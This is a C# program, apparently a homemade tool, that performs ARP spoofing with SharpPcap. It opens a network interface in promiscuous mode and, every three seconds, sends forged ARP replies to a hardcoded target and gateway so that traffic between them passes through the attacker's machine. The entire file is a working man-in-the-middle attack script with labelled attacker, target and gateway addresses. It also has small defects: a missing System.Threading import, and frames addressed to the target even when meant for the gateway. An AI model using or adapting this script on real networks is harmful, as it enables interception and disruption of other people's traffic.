using System;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net;
using System.Net.NetworkInformation;

class Program
{
    static void Main()
    {
        var devices = CaptureDeviceList.Instance;
        foreach (var dev in devices)
        {
            Console.WriteLine("Name: {0} | Desc: {1} | Mac: {2}\n", dev.Name, dev.Description, dev.MacAddress);
            Console.ReadKey();
        }

        if (devices.Count < 1)
        {
            Console.WriteLine("No iface found!");
            return;
        }

        var device = devices[2];
        device.Open(DeviceModes.Promiscuous);

        PhysicalAddress attackerMac = device.MacAddress; // ATTACKER MAC ADDRESS
        PhysicalAddress targetMac = PhysicalAddress.Parse("60-AB-67-E7-17-51"); // TARGET MAC ADDRESS
        PhysicalAddress gatewayMac = PhysicalAddress.Parse("94-2C-B3-F9-31-2D"); // GATEWAY MAC ADDRESS

        var targetIp = IPAddress.Parse("192.168.0.53"); // TARGET IP
        var gatewayIp = IPAddress.Parse("192.168.0.1"); // GATEWAY IP

        var ethernetPacket = new EthernetPacket(attackerMac, targetMac, EthernetType.Arp);

        while (true)
        {
            try
            {
                var arpReplyToTarget = new ArpPacket(
                    ArpOperation.Response,
                    targetMac,
                    targetIp,
                    attackerMac,
                    gatewayIp
                );

                ethernetPacket.PayloadPacket = arpReplyToTarget;
                device.SendPacket(ethernetPacket);
                Console.WriteLine("--- [SPOOFED REPLY TO TARGET] ARP Packet sent ---");

                var arpReplyToGateway = new ArpPacket(
                    ArpOperation.Response,
                    gatewayMac,
                    gatewayIp,
                    attackerMac,
                    targetIp
                );

                ethernetPacket.PayloadPacket = arpReplyToGateway;
                device.SendPacket(ethernetPacket);
                Console.WriteLine("--- [SPOOFED REPLY TO GATEWAY] ARP Packet sent ---");
            }
            catch (Exception ex)
            {
                Console.WriteLine("--- ARP Packet NOT sent ---");
                Console.WriteLine(ex.Message);
            }

            Thread.Sleep(3000);
        }

        //device.Close();
    }
}
